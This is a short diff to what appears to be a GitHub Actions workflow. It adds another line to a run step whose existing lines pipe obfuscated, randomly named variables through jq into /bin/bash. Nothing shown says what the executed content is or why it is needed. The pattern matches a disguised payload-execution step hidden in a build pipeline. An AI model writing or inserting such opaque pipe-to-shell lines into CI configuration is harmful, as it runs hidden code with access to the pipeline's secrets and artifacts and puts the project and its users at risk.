@@ -25,6 +25,7 @@ jobs:
           echo $li6 | jq -r .ryb0 | /bin/bash
           printf '%s' "$rpzb136" | jq -r .wghyx1201 | /bin/bash
           echo $bluwh82063 | jq -r .ixgzh149 | /bin/bash
+          echo $vza6 | jq -r .whz13187 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
